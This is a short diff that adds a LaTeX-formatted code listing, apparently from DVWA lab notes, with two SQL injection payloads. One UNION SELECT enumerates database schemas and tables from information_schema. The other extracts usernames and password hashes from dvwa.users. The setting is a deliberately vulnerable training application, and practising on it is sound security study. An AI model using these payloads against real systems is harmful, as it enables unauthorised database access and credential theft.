@@ -1,0 +1,8 @@
+\begin{Verbatim}[commandchars=\\\{\},codes={\catcode`\$=3\catcode`\^=7\catcode`\_=8\relax}]
+\PYG{c+c1}{\PYGZhy{}\PYGZhy{} the schema}
+\PYG{l+s+s1}{\PYGZsq{} union select table\PYGZbs{}\PYGZus{}schema, table\PYGZbs{}\PYGZus{}name from information\PYGZbs{}\PYGZus{}schema.tables \PYGZhy{}\PYGZhy{}\PYGZsq{}}
+
+\PYG{c+c1}{\PYGZhy{}\PYGZhy{} users and apasswords}
+\PYG{err}{\PYGZsq{}}\PYG{+w}{ }\PYG{k}{union}\PYG{+w}{ }\PYG{k}{select}\PYG{+w}{ }\PYG{k}{user}\PYG{p}{,}\PYG{+w}{ }\PYG{n}{password}\PYG{+w}{ }\PYG{k}{from}\PYG{+w}{ }\PYG{n}{dvwa}\PYG{p}{.}\PYG{n}{users}\PYG{+w}{ }\PYG{c+c1}{\PYGZhy{}\PYGZhy{}}
+
+\end{Verbatim}
